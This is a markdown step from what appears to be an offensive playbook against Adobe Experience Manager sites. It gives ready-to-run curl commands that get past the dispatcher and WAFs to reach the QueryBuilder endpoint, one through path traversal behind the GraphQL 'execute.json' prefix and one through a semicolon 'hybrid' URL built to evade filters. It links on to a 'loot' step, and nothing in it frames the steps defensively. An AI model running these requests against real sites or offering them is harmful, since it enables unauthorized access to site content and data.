# Batch 05 — Trick the bouncer (GraphQL path)

## GOAL
Reach QueryBuilder using Adobe’s GraphQL “side door” paths.

## TIME
~45–75 min

## YOU NEED
- Batch 04 failed (or you want a second way)

---

## WHY (30 seconds)

Some AEM installs tell Apache:  
“Anything under `/graphql/execute.json/...` — send **raw** to AEM, skip the normal guard.”

So you start with that allowed prefix, then walk with `..%2f../` into QueryBuilder.  
The **hybrid** trick hides `graphql/execute` inside a `;...` blob so WAFs that block `../` still miss it.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
```

### 1) GraphQL + walk back

```bash
curl -sk -o /tmp/qb.out -w "gql:%{http_code} bytes=%{size_download}\n" \
  "$T/graphql/execute.json/..%2f../bin/querybuilder.json?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo
```

### 2) Hybrid (often beats WAF)

```bash
curl -sk -o /tmp/qb.out -w "hyb:%{http_code} bytes=%{size_download}\n" \
  "$T/bin/querybuilder.json;x='x/graphql/execute/json/x'?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo
```

### 3) Save winner

```text
QB= (paste full working URL without the ?query part)
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| JSON hits | → **07** |
| Still dead | → **06** |
| Only GraphQL 404 | Site may not have that door — still try hybrid, then 06 |

---

## NEXT
- Win → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
- Fail → [06-bypass-form-selector.md](./06-bypass-form-selector.md)
